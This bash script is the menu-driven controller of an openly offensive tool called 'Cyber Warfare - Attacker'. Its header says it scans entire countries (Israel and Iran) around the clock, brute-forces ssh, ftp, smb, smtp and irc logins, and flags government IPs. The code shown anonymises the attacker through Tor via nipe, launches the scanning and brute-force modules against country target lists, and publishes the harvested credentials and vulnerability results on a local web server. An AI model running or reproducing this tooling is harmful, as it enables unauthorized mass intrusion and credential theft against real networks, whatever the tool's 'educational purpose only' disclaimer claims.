#!/bin/bash

#Author:  TOMER DAHAN
#Github:  https://github.com/tomer333/
#Social:  https:https://www.linkedin.com/in/tomer-dahan-375540235/
#Version: 1.0

#Project Cyber Warfare - Attacker - an attack tool to run on a remote server 24/7 and have the following capabilities:

#1.Scanning and Enumeration
#	-The code should scan and enumerate random ports and IPs
#	-Scanning can be done by Shodan, Masscan, and Nmap (This version only nmap!!).
#
#2.Brute Force
#	-five login services to brute force (chosen: ssh ftp smb smtp irc).
#	
#3.Exploit Analysis
#	- Run infrastructure exploits analysis using NSE and Banner Grabbing.
#
#4.Logs and Reports
#	-Logs should be displayed via the webserver.
#	-Government IPs should be saved in sensitive.log.
#
#5.General
#	-Prepare the server to be anonymous.
#	-The server should be able to scan 24/7 an entire country (countries in this version: IL - Israel and IR - Iran)

#Scanning programed in scan.sh and uses the directory Targets for ip list.
#Brute Force programed in brute.sh and uses files .user.lst and .pass.lst which can be configured.

##Credits: TAHMID RAYAT creater of zphisher


###Main Program: (attacker.sh)
##Thread Programs: (scan.sh and brute.sh)


#Global vars
Country='IL'
Scanner_Type='nmap'

#create necessary directories
#logs for viewing logs in terminal with ANSI colors
#txt for viewing logs in webserver
mkdir ./logs
mkdir ./logs/txt

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

##immune to ctrl+c
trap '' INT

## Reset terminal colors
function reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

#the script name icon and creater
function icon() {
	cat <<- EOF
		${BLUE} 
		${BLUE}░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
		${BLUE}██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
		${BLUE}███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
		${BLUE}██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
		${BLUE}██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
		${BLUE}╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
		${BLUE}  
	            
		${WHITEBG}${GREEN}[${RED}-${GREEN}]${RED} Tool Created by Tomer Dahan${RESETBG}
	EOF
}

## Small icon
function icon_small() {
	cat <<- EOF
		${BLUE}
		${BLUE}╔═══╗╔╗─╔╗──────╔╗
		${BLUE}║╔═╗╠╝╚╦╝╚╗─────║║
		${BLUE}║║─║╠╗╔╩╗╔╬══╦══╣║╔╦══╦═╗
		${BLUE}║╚═╝║║║─║║║╔╗║╔═╣╚╝╣║═╣╔╝
		${BLUE}║╔═╗║║╚╗║╚╣╔╗║╚═╣╔╗╣║═╣║
		${BLUE}╚╝─╚╝╚═╝╚═╩╝╚╩══╩╝╚╩══╩╝	
		${BLUE} 
	EOF
}

#checks if input of ip is valid
#$1 as ip that is being checked
function check_if_ip_addr()
{
	ipcheck="false"
	stat=1
	if [[ $1 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]];
	then
		OIFS=$IFS
		IFS='.'
		ipaddr=($1)
		IFS=$OIFS
		if [[ ${ipaddr[0]} -le 255 && ${ipaddr[1]} -le 255  && ${ipaddr[2]} -le 255 && ${ipaddr[3]} -le 255 ]]
		then
			ip=$1
			ipcheck="true"
		fi
	fi
}

#The user should be able to choose an IP address from the found data, and the server should display:
#Whois Information, Ports and Services and Login Services.
#$1 as ip that user entered
function ip_information()
{
	curr_ip=$1
	check_if_ip_addr $curr_ip
	if [ "$ipcheck" == "false" ]
	then
		printf "\n${RED}[${WHITE}!${RED}]${WHITE} Invalid IP: ${WHITE}$curr_ip\n"
		return
	fi
	ports_services=$(cat "./logs/results.log" | grep "$curr_ip")
	if [ "$ports_services" == "" ]
	then
		printf "\n${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} Not Found...\n"
		return
	fi
	printf "\n${ORANGE}[${WHITE}!${ORANGE}] ${BLUE}Whois information: \n\n${GREEN}"
	whois "$curr_ip" | grep -v "#" | grep -v "Comment:"| grep '\S'
	printf "\n${ORANGE}[${WHITE}!${ORANGE}] ${BLUE}Ports & Services: \n\n"
	cat "./logs/results.log" | grep "$curr_ip"
	printf "\n${ORANGE}[${WHITE}!${ORANGE}] ${BLUE}Login Services: \n\n"
	cat "./logs/credentials.log" | grep "$curr_ip"
	printf "\n\n"
}

##Installation of nipe
function install_nipe()
{
        git clone https://github.com/htrgouvea/nipe > /dev/null 2>&1
        cd nipe && sudo cpan install Try::Tiny Config::Simple JSON > /dev/null 2>&1 && sudo perl nipe.pl install > /dev/null 2>&1 && cd ..
}

#print your current ip origin country
function print_country_after_nipe()
{
	new_ip=$(curl -s ifconfig.me)
	cd nipe && sudo perl nipe.pl stop && cd ..
	country=$(whois "$new_ip" | grep -i country | awk '{print $2}')
	cd nipe && sudo perl nipe.pl start && cd ..
	printf "\n${GREEN}[${WHITE}!${GREEN}] ${MAGENTA}your anonymous now!!!\n"
	printf "${GREEN}[${WHITE}!${GREEN}] ${MAGENTA}your current country is: ${CYAN}$country\n"
	printf "${GREEN}[${WHITE}!${GREEN}] ${MAGENTA}your current ip is: ${CYAN}$new_ip\n\n"
	read -p "${RED}[${WHITE}-${RED}]${BLUE} ${ORANGE}Press Enter to Continue: "
}

#start Nipe
function change_ip()
{
        install_nipe
        cd nipe && sudo perl nipe.pl start && cd ..
        print_country_after_nipe
}

#checks if current ip is IL if true changes ip
function check_ano_change()
{
        my_country=$(whois $(curl -s ifconfig.me) | grep country | awk '{print $2}')
        if [ $my_country == 'IL' ] > /dev/null 2>&1
        then
                echo "${GREEN}[${WHITE}!${GREEN}] ${RED}your country: ${GREEN}$my_country"
                printf "${GREEN}[${WHITE}!${GREEN}] ${RED}your ip: ${GREEN}$(curl -s ifconfig.me)\n"
                 echo "${GREEN}[${WHITE}!${GREEN}] ${RED}you are from israel i'll be changing your ip... ${GREEN}please wait"
                change_ip
        else
                printf "\n${GREEN}[${WHITE}!${GREEN}]${RED}i guess you are smart and you already are anonymous!!! let's continue then...\n\n"
        fi
}

#stops nipe
function stop_nipe()
{
        cd nipe > /dev/null 2>&1 && sudo perl nipe.pl stop && cd ..
}

#removes all trash files and directories at end of program
function remove_trash()
{
	rm -rf nipe > /dev/null 2>&1
	rm res.xml > /dev/null 2>&1
	rm temp.txt > /dev/null 2>&1
	rm -rf ./logs > /dev/null 2>&1
	rm To_Brute.lst > /dev/null 2>&1
	rm BF_results.lst > /dev/null 2>&1
	rm ./Targets/custom_IP_list.lst > /dev/null 2>&1
}

#kills all thread processes at end of program
function kill_procs() 
{
	pid=$(ps -au | grep "scan.sh" | awk '{print $2}')
	pid=$(echo $pid | cut -d ' ' -f1)
	sudo kill -9 "$pid" 
	pid=$(ps -au | grep "brute.sh" | awk '{print $2}')
	pid=$(echo $pid | cut -d ' ' -f1)
	sudo kill -9 "$pid" 
	pid=$(ps -au | grep "http.server" | awk '{print $2}')
	pid=$(echo $pid | cut -d ' ' -f1)
	sudo kill -9 "$pid" 
} > /dev/null 2>&1

#Exit message
function msg_exit() 
{
	{ clear; icon; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	kill_procs
	stop_nipe
	remove_trash
	{ reset_color; exit 0; }
}

#updates all files that are displayed via webserver as long as scan.sh is running
function update_files()
{
	if test -f "./logs/count.log"
	then
		cat ./logs/.sensitive.log | sed -e 's/\x1b\[[0-9;]*m//g' > ./logs/txt/.sensitive.txt 
		cat ./logs/attempts.log | sed -e 's/\x1b\[[0-9;]*m//g' > ./logs/txt/attempts.txt
		cat ./logs/count.log | sed -e 's/\x1b\[[0-9;]*m//g' > ./logs/txt/count.txt
		cat ./logs/credentials.log | sed -e 's/\x1b\[[0-9;]*m//g' > ./logs/txt/credentials.txt
		cat ./logs/results.log | sed -e 's/\x1b\[[0-9;]*m//g' > ./logs/txt/results.txt
		cat ./logs/vul.log | sed -e 's/\x1b\[[0-9;]*m//g' > ./logs/txt/vul.txt
	fi
}

#start webserver on directory ./log/txt
function web_setup()
{
	python3 -m http.server 8080 -d ./logs/txt &>/dev/null &
}

#Waits for scan.sh to finish while printing on screen loading spinner
function waiting()
{
	web_setup
	i=1
	#sp - spinner chars - can be modified
	sp="◐◓◑◒"
	{ clear; icon_small;}
	printf "${ORANGEBG}${BLACK} Your Scanner Is Running: ${REDBG}${WHITE} $Scanner_Type ${RESETBG}\n"
	printf "\n${GREENBG}${BLACK}To See Results Logs Enter Webserver:${CYANBG}${BLACK} http://0.0.0.0:8080/ ${RESETBG}\n"
	printf "\n${ORANGE}[${RED}!${ORANGE}]${MAGENTA} To See Results In This Menu Wait For End Of Scanner... ${BLUE}"
	#blocks user from entering any key
	stty -echo
	while [ -d /proc/$scanner_pid ]
	do
		update_files
		sleep 0.3
		printf "\b${sp:i++%${#sp}:1}"
	done
	#unblocks user from entering any key
	stty echo
	update_files
	result_menu
}

#firsts checks if ip is anonymous
#initializes files ./logs/credentials.log and ./logs/attempts.log for brute force logs (brute.sh)
#runs scan.sh as a thread and captures the thread pid
function start_scanner()
{
	echo -e "${GREENBG}${BLACK} You chose: ${BLUEBG}${RED}  $Scanner_Type  ${RESETBG}\n"
	check_ano_change
	echo "${BLUE}Brute Force Results:" > ./logs/credentials.log
	echo "${RED}Brute Force Attempts:" > ./logs/attempts.log
	bash scan.sh $Target_List &
	scanner_pid=$!
	waiting
}

#creates custom ip list for user using the script - ./Targets/org.sh
#user requires to enter first and last ip in desired ip range
function custom_ip_list()
{
	read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter the first ip in your desired ip range (only class C subnet mask: 255.255.255.0): ${GREEN}" f_ip
	check_if_ip_addr $f_ip
	if [ "$ipcheck" == "false" ]
	then
		printf "\n${RED}[${WHITE}!${RED}]${WHITE} Invalid IP: ${WHITE}$f_ip\n"
		sleep 1
		return
	fi
	read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter the last ip in your desired ip range (only class C subnet mask: 255.255.255.0): ${GREEN}" l_ip
	check_if_ip_addr $l_ip
	if [ "$ipcheck" == "false" ]
	then
		printf "\n${RED}[${WHITE}!${RED}]${WHITE} Invalid IP: ${WHITE}$l_ip\n"
		sleep 1
		return
	fi
	echo "$f_ip $l_ip" > UserList.lst
	bash ./Targets/org.sh UserList.lst ./Targets/custom_IP_list.lst
	rm UserList.lst > /dev/null 2>&1
	tunnel_menu
}

## Result selection menu
function result_menu() {
	{ clear; icon_small;}
	cat <<- EOF
		${ORANGEBG}${BLACK} Your Scanner Finished: ${REDBG}${WHITE} $Scanner_Type ${RESETBG}
		
		${GREENBG}${BLACK}To See Results Logs Enter Webserver:${CYANBG}${BLACK} http://0.0.0.0:8080/ ${RESETBG}
		
		
		${RED}[${WHITE}01${RED}]${MAGENTA} Number of IPs & Ports
		${RED}[${WHITE}02${RED}]${MAGENTA} IP Mapping
		${RED}[${WHITE}03${RED}]${MAGENTA} Sensitive IPs
		${RED}[${WHITE}04${RED}]${MAGENTA} Choose IP for more information
		${RED}[${WHITE}05${RED}]${MAGENTA} All Possible Exploits
		${RED}[${WHITE}06${RED}]${MAGENTA} Brute Force Results
		${RED}[${WHITE}07${RED}]${MAGENTA} Brute Force Attempts
		
		
		
		${RED}[${WHITE}99${RED}]${MAGENTA} Back to Main        ${RED}[${WHITE}00${RED}]${MAGENTA} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select data to see: ${BLUE}"
	
	
	case $REPLY in 
		1 | 01)
			printf "\n\n"
			cat ./logs/count.log
			printf "\n\n"
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Press Enter to return: "
			result_menu;;
		2 | 02)
			printf "\n\n"
			cat ./logs/results.log
			printf "\n\n"
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Press Enter to return: "
			result_menu;;
		3 | 03)
			printf "\n\n"
			cat ./logs/.sensitive.log
			printf "\n\n"
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Press Enter to return: "
			result_menu;;
		4 | 04)
			printf "\n\n"
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter an IP: " input_ip
			ip_information $input_ip
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Press Enter to return: "
			result_menu;;
		5 | 05)
			printf "\n\n"
			cat ./logs/vul.log
			printf "\n\n"
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Press Enter to return: "
			result_menu;;
		6 | 06)
			printf "\n\n"
			cat ./logs/credentials.log
			printf "\n\n"
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Press Enter to return: "
			result_menu;;
		7 | 07)
			printf "\n\n"
			cat ./logs/attempts.log
			printf "\n\n"
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Press Enter to return: "
			result_menu;;
		99)
			main_menu;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; result_menu; };;
	esac
}

## Tunnel selection
function tunnel_menu() {
	{ clear; icon_small;}
	cat <<- EOF
		${GREENBG}${BLACK} Your Chosen Country Is: ${MAGENTABG}${RED}  $Country  ${RESETBG}
		
		${RED}[${WHITE}01${RED}]${ORANGE} nmap	${RED}[${CYAN}Identifies Exploits Better${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} masscan	${RED}[${CYAN}Faster Scan${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} shodan  	${RED}[${CYAN}Randomize Scan(Needs API)${RED}]
		
		
		
		${RED}[${WHITE}99${RED}]${ORANGE} Back to Main        ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a mapping service : ${BLUE}"

	case $REPLY in 
		1 | 01)   
			Scanner_Type='nmap'
			start_scanner;;
		2 | 02)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Yet to be added... wait for Attacker version 2.0"
			Scanner_Type='masscan'
			sleep 3
			tunnel_menu;;
		3 | 03)
			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Yet to be added... wait for Attacker version 2.0"
			Scanner_Type='shodan'
			sleep 3
			tunnel_menu;;
		99)
			main_menu;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}


#main menu
function main_menu() {
	{ clear; icon; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select Your Desired Country To Activate This Tool On${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Israel
		${RED}[${WHITE}02${RED}]${ORANGE} Iran
		${RED}[${WHITE}03${RED}]${ORANGE} Custom IP range



		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
	
	case $REPLY in
		1 | 01)
			Country='IL'
			Target_List="./Targets/IL_Targets.lst"
			tunnel_menu;;
		2 | 02)
			Country='IR'
			Target_List="./Targets/IR_Targets.lst"
			tunnel_menu;;
		3 | 03)
			printf "\n${GREEN}[${ORANGE}*${GREEN}]${WHITE} Enter Your Custom IP range (example: first - 192.168.198.1 last - 192.168.198.254)\n"
			Country='Custom'
			Target_List="./Targets/custom_IP_list.lst"
			custom_ip_list
			main_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;

	esac
}
## About
function about() {
	{ clear; icon; echo; }
	cat <<- EOF
		${GREEN}Authors  ${RED}:  ${ORANGE}TOMER DAHAN
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/tomer333/
		${GREEN}Social   ${RED}:  ${CYAN}https:https://www.linkedin.com/in/tomer-dahan-375540235/
		${GREEN}Version  ${RED}:  ${ORANGE}1.0

		${GREENBG}${WHITE} Thanks To: TAHMID RAYAT creater of zphisher ${RESETBG}

		${RED}Warning:
		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
		${CYAN}Authors will not be responsible for any misuse of this toolkit ${RED}!${WHITE}

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

##start of program
main_menu
